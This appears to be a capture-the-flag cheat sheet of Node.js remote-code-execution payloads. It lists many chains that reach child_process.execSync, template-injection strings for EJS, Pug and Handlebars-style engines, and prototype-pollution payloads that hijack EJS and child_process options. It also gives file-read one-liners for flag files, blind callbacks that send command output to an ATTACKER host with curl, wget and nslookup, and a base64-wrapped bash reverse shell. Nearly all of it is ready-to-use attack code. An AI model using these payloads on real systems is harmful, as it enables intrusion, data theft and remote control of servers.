# Node.js

## Reach `execSync`

Use these when a JavaScript expression reaches `eval`, template compilation, debug routes, sandboxed code, polluted template options, Electron/NW.js, or a worker job handler.

Direct require:

```js
require('child_process').execSync('id').toString()
require('node:child_process').execSync('id').toString()
require.main.require('child_process').execSync('id').toString()
```

Via `process.mainModule`:

```js
process.mainModule.require('child_process').execSync('id').toString()
global.process.mainModule.require('child_process').execSync('id').toString()
globalThis.process.mainModule.require('child_process').execSync('id').toString()
```

Via module loader internals:

```js
module.constructor._load('child_process').execSync('id').toString()
process.mainModule.constructor._load('child_process').execSync('id').toString()
require('module')._load('child_process').execSync('id').toString()
```

When only `Function` construction is reachable:

```js
Function('return process')().mainModule.require('child_process').execSync('id').toString()
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
globalThis.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
[].filter.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
Buffer.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
```

Short aliases for cramped sinks:

```js
p=process.mainModule.require;p('child_process').execSync('id')+''
c=process.mainModule.require('child_process');c.execSync('id')+''
```

## Output

```js
require('child_process').execSync('id').toString()
require('child_process').execSync('cat /flag* 2>&1').toString()
require('child_process').execFileSync('/bin/sh',['-c','id']).toString()
require('child_process').spawnSync('/bin/sh',['-c','id']).stdout.toString()
```

Blind callbacks:

```js
require('child_process').execSync('curl http://ATTACKER/$(id|base64 -w0)')
require('child_process').execSync('wget -qO- http://ATTACKER/$(cat /flag*|base64 -w0)')
require('child_process').execSync('nslookup $(whoami).ATTACKER')
```

Reverse shell with base64 to avoid quote/space pain:

```bash
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" | base64 -w0
```

```js
require('child_process').execSync('bash -c {echo,BASE64}|{base64,-d}|{bash,-i}')
```

## Template Wrappers

EJS:

```ejs
<%= process.mainModule.require('child_process').execSync('id').toString() %>
<%= globalThis.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString() %>
```

Pug:

```pug
#{process.mainModule.require('child_process').execSync('id').toString()}
- var x = process.mainModule.require('child_process').execSync('id').toString()
```

Nunjucks / Handlebars-style constructor chains depend on exposed objects, but these shapes are worth trying:

```text
{{range.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()}}
{{this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()}}
```

## Prototype Pollution Embeds

EJS polluted options:

```json
{"__proto__":{"client":true}}
{"__proto__":{"escapeFunction":"JSON.stringify;process.mainModule.require('child_process').execSync('id')"}}
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}
{"__proto__":{"localsName":"it;return process.mainModule.require('child_process').execSync('id');//"}}
```

Child process option pollution:

```json
{"__proto__":{"shell":"/bin/sh"}}
{"__proto__":{"argv0":"sh"}}
{"__proto__":{"execArgv":["--eval=require('child_process').execSync('id')"]}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/pwn.js"}}}
```

## Sandbox Notes

Look for available globals before choosing a chain:

```js
typeof require
typeof process
typeof module
Object.keys(globalThis).filter(x=>/process|require|module|Buffer/i.test(x))
```

If `require` is removed but `process` exists, use `process.mainModule` or loader internals. If `process` is removed but `Function` is reachable, try constructor chains. If both are removed, search for app-provided wrappers such as `imports`, `loader`, `Module`, `webpackRequire`, `ipcRenderer`, or debug helpers.

## File Read

Sometimes reading the flag is enough and less noisy than command execution.

```js
require('fs').readFileSync('/flag.txt','utf8')
process.mainModule.require('fs').readFileSync('/flag.txt','utf8')
module.constructor._load('fs').readFileSync('/flag.txt','utf8')
```

